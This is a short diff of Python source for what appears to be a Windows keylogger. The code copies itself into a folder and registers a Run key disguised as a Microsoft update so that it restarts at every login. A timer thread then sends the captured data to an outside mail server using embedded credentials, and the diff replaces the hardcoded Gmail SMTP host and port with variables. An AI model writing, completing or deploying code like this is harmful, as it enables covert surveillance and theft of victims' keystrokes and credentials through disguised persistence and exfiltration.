@@ -28,7 +28,7 @@ def startup():
     shutil.copy(sys.argv[0],dir)
     aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-    SetValueEx(aKey,"MicrosoftUpdate",0, REG_SZ, dir)	
+    SetValueEx(aKey,"MicrosoftUpdateXX",0, REG_SZ, dir)	
 if path.isfile(dir) == False:
     startup()	
 
@@ -41,8 +41,8 @@ class TimerClass(threading.Thread):
             global data
             if len(data)>50:
                 ts = datetime.datetime.now()
-                SERVER = "smtp.gmail.com"
-                PORT = 587
+                SERVER = gh
+                PORT = ghp
                 USER = EEMAIL
                 PASS = EPASS
                 FROM = USER
